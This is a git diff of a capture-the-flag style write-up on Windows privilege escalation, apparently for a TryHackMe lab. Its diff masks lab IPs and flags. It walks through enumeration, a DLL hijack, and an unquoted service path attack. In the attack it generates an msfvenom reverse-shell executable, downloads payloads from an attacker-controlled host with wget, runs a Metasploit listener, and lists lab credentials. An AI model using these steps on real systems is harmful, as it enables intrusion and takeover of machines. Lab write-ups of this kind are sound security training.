@@ -89,6 +89,34 @@ driverquery
 sc.exe query windefend
 ```
 
+| Title | IP Address |
+| :---- | :---- |
+| WinPriv_Enum | `1*.**.**.***` |
+
+```cmd
+net user
+```
+
+> `Guest THM-***** user`
+
+```cmd
+systeminfo | findstr /b /c:"OS Version"
+```
+
+> `OS Version: 1*.*.***** N/A B**** 1****`
+
+```cmd
+wmic qfe get HotFixID,InstalledOn | findstr /c:"KB4562562"
+```
+
+> `KB4562562 6/**/****`
+
+```cmd
+sc query windefend
+```
+
+> `STATE : *******`
+
 ## Tools of the trade
 
 ### WinPEAS
@@ -162,7 +190,9 @@ sc stop dllsvc & sc start dllsvc
 
 | Title | IP Address |
 | :---- | :---- |
-| DLL_Hijack | 10.10.123.106 |
+| DLL_Hijack | `1*.**.***.***` |
+
+LHOST:
 
 ```c
 /* hijackme.c */
@@ -181,78 +211,86 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
 ```
 
-lhost:
-
 ```bash
 python3 -m http.server 80
 ```
 
-rhost:
+RHOST using `powershell`:
 
 ```cmd
-wget 10.6.31.75:80/hijackme.dll -O C:\Temp\hijackme.dll
+wget 1*.*.**.**:80/hijackme.dll -O C:\Temp\hijackme.dll
 sc.exe stop dllsvc; sc.exe start dllsvc
-xfreerdp /u:jack /p:Password123 /v:10.10.123.106
 ```
 
-`Documents` folder:
+LHOST:
 
-> `THM-8377492093`
+```bash
+xfreerdp /u:jack /p:Password123 /v:1*.**.***.***
+```
+
+`Documents\flagdll.txt`:
+
+> `THM-**********`
 
 ## Unquoted Service Path
 
-```cmd
-wmic service get name,displayname,pathname,startmode
-```
-
 | Title | IP Address |
 | :---- | :---- |
-| Unquoted_SP | 10.10.225.253 |
+| Unquoted_SP | `1*.**.***.***` |
+
+RHOST:
 
 ```cmd
-sc.exe qc unquotedsvc
-.\accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+wmic service get name,displayname,pathname,startmode
+sc qc unquotedsvc
+```
+
+> `BINARY_PATH_NAME : C:\P****** F****\U******* P*** S******\C***** F****\*******************.***`
+
+```cmd
+cd Desktop
+.\accesschk64.exe /accepteula -uwdq "C:\P****** F****\U******* P*** S******\"
 ```
 
 > `RW BUILTIN\Users`
 
-lhost:
+LHOST:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.31.75 LPORT=9999 -f exe -o Common.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=1*.*.**.** LPORT=9999 -f exe -o C*****.*** 
 python3 -m http.server 80
 ```
 
 ```bash
 msfconsole
 use exploit/multi/handler
-set lhost 10.6.31.75
+set lhost 1*.*.**.**
 set lport 9999
 set payload windows/x64/shell_reverse_tcp
 run
 ```
 
-rhost:
+RHOST:
 
 ```cmd
-wget 10.6.31.75:80/Common.exe -O "C:\Program Files\Unquoted Path Service\Common.exe"
+wget 1*.*.**.**:80/Common.exe -O "C:\Program Files\U******* P*** S******\C*****.exe"
 sc.exe start unquotedsvc
 ```
 
-lhost:
+- Reverse shell:
 
 ```cmd
 cd ../..
 dir flagUSP.txt /s
 ```
-> ` Directory of C:\Users\Cora\Documents 10/14/2021  11:54 PM 16 flagUSP.txt`
+> ` Directory of C:\*****\****\********* 10/14/2021  11:54 PM 16 flagUSP.txt`
 
 ```cmd
 powershell
-cat C:\Users\Cora\Documents\flagUSP.txt
+cat C:\*****\****\*********\flagUSP.txt
 ```
 
-> `THM-636729273483`
+> `THM-************`
 
 ## Quick Wins
 
